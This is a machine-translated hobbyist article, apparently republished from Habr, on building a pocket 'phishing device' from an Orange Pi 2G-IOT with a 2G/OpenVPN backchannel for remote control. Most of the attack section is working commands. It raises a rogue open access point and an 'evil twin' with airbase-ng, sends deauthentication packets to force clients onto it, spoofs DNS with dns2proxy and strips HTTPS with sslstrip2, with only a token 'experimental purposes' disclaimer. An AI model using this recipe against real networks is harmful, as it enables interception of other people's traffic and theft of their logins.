<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Orange Pi 2G-IOT or Orange Paradise</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Wool spaces of AliExpress 
 In search of a Raspberry Pi, I came across such a device like this. 


 This $ 10 single-board has modest dimensions (67x4...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Orange Pi 2G-IOT or Orange Paradise</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/webt/59/ca/c2/59cac247b4fb7547619158.jpeg" align="left"><br><p>  Wool spaces of AliExpress <br>  In search of a Raspberry Pi, I came across such a device like this. </p><br><p>  This $ 10 single-board has modest dimensions (67x42mm), contains: Cortex-A5 1.0 GHz, 256MB of RAM, 512MB of NAND, and most importantly - the built-in <strong>WI-FI and 2G adapters</strong> ! </p><br><p>  I immediately remembered the article ‚Äú <a href="https://xakep.ru/2013/10/01/61348/">Pineapple Paradise</a> ‚Äù, published in Hacker magazine back in 2013, and I was excited to turn the ‚Äúorange‚Äù into a phishing device. </p><a name="habracut"></a><br><p>  Sazu will make a reservation that all this is done solely for <strong>experimental purposes</strong> . </p><br><h4 id="pervye-prigotovleniya">  First preparations </h4><br><p>  So, go to <a href="http://www.orangepi.org/downloadresources/">the manufacturer's website</a> and download the OS image, I chose Raspbian.  Next, unpack it on the micro sd card, put the jumper in the T-Card position and turn on the power. </p><br><p>  To connect, you can use usb-ttl adapter, or set login / password in <u>/ etc / network / interfaces</u> and connect via ssh. </p><br><p>  Now you can connect to Wi-Fi via <strong>wpa_cli</strong> </p><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre><code class="plaintext hljs">add_network set_network 1 ssid "login" set_network 1 psk "password" save_config enable_network 1</code> </pre> </div></div><br><p>  Configure <strong>dhcp</strong> </p><br><pre> <code class="plaintext hljs">dhclient wlan0</code> </pre> <br><h4 id="podklyuchaemsya-cherez-2g">  Connect via 2g </h4><br><p>  Install packages </p><br><pre> <code class="bash hljs">apt-get install ppp wvdial</code> </pre> <br><p>  We create config files (I used a sim card from MTS). </p><br><div class="spoiler">  <b class="spoiler_title">/etc/wvdial.conf</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">[Dialer Defaults] ISDN = 0 Modem Type = Analog Modem Phone = *99***1# Stupid Mode = 1 Dial Command = ATDT Modem = /dev/modem0 Baud = 460800 Init1 = ATE1 Init2 = AT+COPS=0 Init3 = AT+CFUN=1 Init4 = AT+CGATT=1 Init5 = AT+CGDCONT=1,"IP","internet.mts.ru","",0,0 Init6 = AT+CGACT=1,1 Username = mts Password = mts</code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">/ etc / ppp / peers / mts</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">ipcp-accept-local ipcp-accept-remote noipdefault defaultroute replacedefaultroute usepeerdns user mts noauth novj nobsdcomp crtscts modem lock</code> </pre> </div></div><br><p>  We try to connect;  ppp0 connection should appear. </p><br><pre> <code class="bash hljs">wvdial</code> </pre> <br><p>  The connection may fall out, so we will write a script that will constantly pull the network. </p><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash while : ; do wvdial sleep 10 done ) &amp;</span></span></code> </pre> <br><p>  And put it on autostart in <u>/etc/rc.local</u> <br> <code>/root/scripts/wvdial &gt;/dev/null 2&gt;&amp;1 &amp;</code> </p> <br><h4 id="nastraivaem-openvpn">  Configure openvpn </h4><br><p>  Now let's install openvpn so that we can connect via SSH to our ‚Äúorange‚Äù without static. </p><br><pre> <code class="bash hljs">apt-get install openvpn</code> </pre> <br><p>  Guides on settings can be found <a href="http://help.ubuntu.ru/wiki/openvpn">on the network</a> , the only thing is that in the server config file you need to uncomment the option for routing traffic between hosts. <br> <code>client-to-client</code> </p> <br><p>  After tuning, a tun0 connection appears, restart openvpn and add it to autoload. </p><br><pre> <code class="bash hljs">systemctl restart openvpn &amp;&amp; systemctl <span class="hljs-built_in"><span class="hljs-built_in">enable</span></span> openvpn</code> </pre> <br><p>  Now you can connect to the device, bypassing the statics.  So that the 2G connection does not seem like pain to us, we change the priorities of the adapters and restart openvpn. </p><br><pre> <code class="bash hljs">ip route del default &amp;&amp; \ ip route add default via 192.168.100.1 dev wlan0 &amp;&amp; \ ip route add 192.168.100.0/24 via 192.168.100.1 dev wlan0 &amp;&amp; \ service openvpn restart</code> </pre> <br><h4 id="podnimaem-tochku-dostupa">  Raise the access point </h4><br><p>  We connect external usb Wifi adapter and install packages </p><br><pre> <code class="bash hljs">apt-get install git dsniff isc-dhcp-server</code> </pre> <br><p>  Set up dhcpd server. </p><br><div class="spoiler">  <b class="spoiler_title">/etc/dhcp/dhcpd.conf</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">authoritative; default-lease-time 600; max-lease-time 7200; subnet 172.16.0.0 netmask 255.255.255.0 { option routers 172.16.0.1; option subnet-mask 255.255.255.0; option domain-name-servers 172.16.0.1,8.8.8.8; range 172.16.0.2 172.16.0.254; }</code> </pre> </div></div><br><p>  Enable traffic routing </p><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> 1 &gt; /proc/sys/net/ipv4/ip_forward</code> </pre> <br><p>  Now run the access point: </p><br><pre> <code class="bash hljs">airbase-ng -e FREE wlan1 -c 2</code> </pre> <br><p>  Raise the network </p><br><pre> <code class="bash hljs">ifconfig at0 up ifconfig at0 172.16.0.1 netmask 255.255.255.0</code> </pre> <br><p>  Configure the firewall </p><br><pre> <code class="bash hljs">iptables --flush iptables --table nat --flush iptables --delete-chain iptables --table nat --delete-chain iptables -P FORWARD ACCEPT iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE iptables --append FORWARD -j ACCEPT --<span class="hljs-keyword"><span class="hljs-keyword">in</span></span>-interface at0</code> </pre> <br><p>  We start the dhcp daemon </p><br><pre> <code class="bash hljs">dhcpd -cf /etc/dhcp/dhcpd.conf</code> </pre> <br><p>  Great, the access point is working, the routing is working.  We can also create an ‚Äúevil twin‚Äù by changing the SSID of the access point, MAC address and communication channel.  You can find out information about available access points, as well as clients connected to them, by running the airodump-ng utility. </p><br><pre> <code class="bash hljs">airodump-ng wlan0</code> </pre> <br><p>  You can even send packets for disconnection to the client so that it connects to our TD. </p><br><pre> <code class="bash hljs">aireplay-ng -0 1 -a 01:02:03:04:05:06 -c 11:12:13:14:15:16 wlan0</code> </pre> <br><p>  01: 02: 03: 04: 05: 06 - mac TD. <br>  11: 12: 13: 14: 15: 16 - mac client. </p><br><h4 id="dns-spoofing">  DNS Spoofing </h4><br><p>  Download the repository. </p><br><pre> <code class="bash hljs">git <span class="hljs-built_in"><span class="hljs-built_in">clone</span></span> https://github.com/LeonardoNve/dns2proxy</code> </pre> <br><p>  We edit domains.cfg for ourselves and launch the program. </p><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">".test.com 172.16.0.1"</span></span> &gt;&gt; domains.cfg apt-get install nginx //   python3 dns2proxy.py</code> </pre> <br><p>  Now, clients visiting test.com will get to our local web server. </p><br><h4 id="ssl-stripping">  SSL Stripping </h4><br><p>  Download the repository </p><br><pre> <code class="bash hljs">git <span class="hljs-built_in"><span class="hljs-built_in">clone</span></span> https://github.com/byt3bl33d3r/sslstrip2</code> </pre> <br><p>  Redirect traffic. </p><br><pre> <code class="bash hljs">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</code> </pre> <br><p>  Run the program. </p><br><pre> <code class="bash hljs">python sslstrip -l 10000</code> </pre> <br><p>  Unfortunately, now sslstrip2 does not work with all sites. </p><br><h4 id="itog">  Total </h4><br><p>  For $ 10 it turned out to collect the same "Pineapple", but much more compact.  With a 2000mAh battery, the device lasts about a day. </p><br><img src="https://habrastorage.org/webt/uv/5o/f7/uv5of7dq2oazb_mxealhsg4unka.png"><br><p><br>  ‚Üí Characteristics on <a href="http://www.orangepi.org/OrangePi2GIOT/">the manufacturer's website</a> . <br>  ‚Üí Scripts on raising fake ap gathered in the <a href="https://github.com/bad-day/fakeAP">repository</a> . </p><br><p>  PS <br>  Before buying a device, I strongly recommend that you read the article of <a href="https://habr.com/ru/post/440960/">Orange Pi 2G-IOT: minefield map</a> </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/357966/">https://habr.com/ru/post/357966/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../357956/index.html">ACS, raspberry and kettle</a></li>
<li><a href="../357958/index.html">Thermal Raspberry Pi 3 showed a temperature of 101¬∫C</a></li>
<li><a href="../357960/index.html">We acquaint Qt with Raspberry Pi 3</a></li>
<li><a href="../357962/index.html">Restricted Access and CCTV at Raspberry PI</a></li>
<li><a href="../357964/index.html">Access Controller for Go + Raspberry Pi + Arduino Nano</a></li>
<li><a href="../357968/index.html">Released updated Raspberry Pi 3 Model B +</a></li>
<li><a href="../357970/index.html">Second GIS-hackathon "Guessing on the Cards"</a></li>
<li><a href="../357972/index.html">Reverse "Neuromant". Part 2: Render the Font</a></li>
<li><a href="../357974/index.html">Get free, quick, easy and simple system information from a variety of PCs on the network</a></li>
<li><a href="../357976/index.html">The basis of the gameplay in C ++ for the Unreal Engine</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>